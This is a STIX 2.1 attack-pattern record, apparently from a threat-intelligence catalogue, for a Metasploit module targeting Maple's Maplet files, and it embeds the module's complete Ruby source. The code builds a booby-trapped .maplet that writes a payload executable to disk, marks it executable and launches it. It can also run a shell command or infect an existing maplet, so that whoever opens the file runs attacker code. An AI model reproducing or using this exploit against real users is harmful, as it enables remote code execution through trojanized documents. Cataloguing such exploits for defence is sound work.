{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--83f4b63b-00dd-4d43-b5c3-424b7f289910",
    "created": "2024-08-14T17:05:02.134123Z",
    "modified": "2024-08-14T17:05:02.134127Z",
    "name": "Maple Maplet File Creation and Command Execution",
    "description": " This module harnesses Maple's ability to create files and execute commands automatically when opening a Maplet. All versions up to 13 are suspected vulnerable. Testing was conducted with version 13 on Windows. Standard security settings prevent code from running in a normal maple worksheet without user interaction, but those setting do not prevent code in a Maplet from running.  In order for the payload to be executed, an attacker must convince someone to open a specially modified .maplet file with Maple. By doing so, an attacker can execute arbitrary code as the victim user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/maple_maplet.rb",
            "external_id": "maple_maplet.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.maplesoft.com/products/maple/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Maple Maplet File Creation and Command Execution',\n      'Description'    => %q{\n          This module harnesses Maple's ability to create files and execute commands\n        automatically when opening a Maplet. All versions up to 13 are suspected\n        vulnerable. Testing was conducted with version 13 on Windows. Standard security\n        settings prevent code from running in a normal maple worksheet without user\n        interaction, but those setting do not prevent code in a Maplet from running.\n\n        In order for the payload to be executed, an attacker must convince someone to\n        open a specially modified .maplet file with Maple. By doing so, an attacker can\n        execute arbitrary code as the victim user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'scriptjunkie'\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '64541'],\n          [ 'URL', 'http://www.maplesoft.com/products/maple/' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => '',\n          'DisableNops' => true,\n#\t\t\t\t\t'Compat'      =>\n#\t\t\t\t\t\t{\n#\t\t\t\t\t\t\t'PayloadType' => 'cmd',\n#\t\t\t\t\t\t\t'RequiredCmd' => 'generic perl telnet',\n#\t\t\t\t\t\t}\n        },\n      'Platform'       => %w{ win linux unix },\n      'Targets'        =>\n        [\n          [ 'Windows',\n            {\n              'Arch'      => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n\n          [ 'Windows X64',\n            {\n              'Arch'      => ARCH_X64,\n              'Platform' => 'win'\n            }\n          ],\n\n          [ 'Linux',\n            {\n              'Arch'      => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ],\n\n          [ 'Linux X64',\n            {\n              'Arch'      => ARCH_X64,\n              'Platform' => 'linux'\n            }\n          ],\n\n          ['Universal CMD',\n            {\n              'Arch'      => ARCH_CMD,\n              'Platform'       => %w{ linux unix win }\n            }\n          ]\n\n        ],\n      'DisclosureDate' => '2010-04-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TEMPLATE', [ false, 'The file to infect.', '']),\n        OptString.new('FILENAME', [ true, 'The output file.', 'msf.maplet']),\n      ])\n\n  end\n\n\n  def exploit\n    cmd = ''\n    content = ''\n    if target['Arch'] != ARCH_CMD\n      #Get payload as executable on whatever platform\n      binary = generate_payload_exe\n\n      #Get filename and random variable name for file handle in script\n      fname = rand_text_alpha(3+rand(15))\n      if target['Platform'] == 'win'\n        fname << \".exe\"\n      end\n      fhandle = rand_text_alpha(3+rand(15))\n\n      #Write maple commands to create executable\n      content = fhandle + \" := fopen(\\\"#{fname}\\\",WRITE,BINARY);\\n\"\n      exe = binary.unpack('C*')\n\n      content << \"writebytes(#{fhandle},[#{exe[0]}\"\n      lines = []\n      1.upto(exe.length-1) do |byte|\n        if(byte % 100 == 0)\n          lines.push \"]);\\r\\nwritebytes(#{fhandle},[#{exe[byte]}\"\n        else\n          lines.push \",#{exe[byte]}\"\n        end\n      end\n      content << lines.join(\"\") + \"]);\\r\\n\"\n\n      content << \"fclose(\" + fhandle + \");\\n\"\n      #Write command to be executed\n      if target['Platform'] != 'win'\n        content << \"system(\\\"chmod a+x #{fname}\\\");\\n\"\n      end\n      content << \"system[launch](\\\"#{fname}\\\");\\n\"\n    else\n      content << \"system(\\\"#{payload.encoded}\\\");\\n\"\n    end\n\n    #Then put the rest of the original maplet\n    if datastore['TEMPLATE'] != ''\n      File.open(datastore['TEMPLATE'], 'rb') do |fd|\n        content << fd.read( File.size(datastore['TEMPLATE']) )\n      end\n    end\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(content)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-26",
    "x_mitre_platforms": [
        "%w{ linux unix win }"
    ]
}